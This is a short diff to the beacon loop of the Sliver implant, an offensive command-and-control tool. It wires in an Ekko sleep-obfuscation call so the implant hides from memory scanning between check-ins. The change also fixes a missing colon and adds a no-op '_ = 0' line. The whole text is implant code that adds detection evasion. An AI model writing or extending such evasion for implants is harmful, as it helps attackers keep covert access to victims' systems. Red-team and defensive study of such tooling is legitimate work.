@@ -50,6 +50,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/implant/sliver/ekko"
 
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
@@ -332,11 +333,12 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		select {
 		case <-errors:
 			return err
-		case <-completion
+		case <-completion:
 			// check if there's still time to sleep
-			secondsUntilNextCheckIn := time.Until(nextCheckin).Seconds()
-			if secondsUntilNextCheckIn > 1 {
-				applyEkko(secondsUntilNextCheckIn)
+			timeUntilNextCheckIn := time.Until(nextCheckin)
+			if timeUntilNextCheckIn.Seconds() > 1 {
+				_ = 0
+				ekko.EkkoSleep(uint64(timeUntilNextCheckIn.Milliseconds()))
 			}
 		case <-shortCircuit:
 			// Short circuit current duration with no error
